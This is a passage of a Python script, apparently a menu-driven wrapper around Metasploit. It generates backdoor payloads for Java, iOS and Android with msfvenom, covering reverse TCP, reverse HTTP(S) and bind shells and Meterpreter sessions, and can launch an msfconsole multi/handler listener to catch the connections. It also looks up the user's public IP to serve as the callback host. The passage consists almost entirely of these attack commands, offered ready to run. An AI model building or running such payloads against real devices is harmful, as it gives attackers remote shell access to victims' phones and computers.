                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/meterpreter/reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()        
                elif java1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_https LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/meterpreter/reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()          
                elif java1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()                    
                elif java1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()                    
                elif java1 == "5":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/shell_reverse_tcp LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/shell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()                      
                elif java1 == "6":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/bind_tcp LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/meterpreter/bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()  
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()              
                elif java1 == "7":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform java -f jar -p java/shell/bind_tcp LHOST={0} LPORT={1} -o backdoor.jar".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "java/shell/bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()                    
            elif paylo == "9":
                print("""
[1] > apple_ios/aarch64/meterpreter_reverse_http
[2] > apple_ios/aarch64/meterpreter_reverse_https
[3] > apple_ios/aarch64/meterpreter_reverse_tcp
[4] > apple_ios/aarch64/shell_reverse_tcp
""")            
                app1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if app1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_http LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "apple_ios/aarch64/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()        
                elif app1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_https LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "apple_ios/aarch64/meterpreter_reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()          
                elif app1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "apple_ios/aarch64/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()            
                elif app1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/shell_reverse_tcp LHOST={0} LPORT={1} -o backdoor.macho".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "apple_ios/aarch64/shell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()          
            elif paylo == "4":
                print("""
[1] > android/shell/reverse_http
[2] > android/shell/reverse_https
[3] > android/shell/reverse_tcp
[4] > android/meterpreter/reverse_http
[5] > android/meterpreter/reverse_https
[6] > android/meterpreter/reverse_tcp
[7] > android/meterpreter_reverse_http
[8] > android/meterpreter_reverse_https
[9] > android/meterpreter_reverse_tcp
""")
                andr1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if andr1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/shell/reverse_http LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/shell/reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()          
                elif andr1 == "2":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/shell/reverse_https LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/shell/reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif andr1 == "3":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/shell/reverse_tcp LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif andr1 == "4":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_http LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
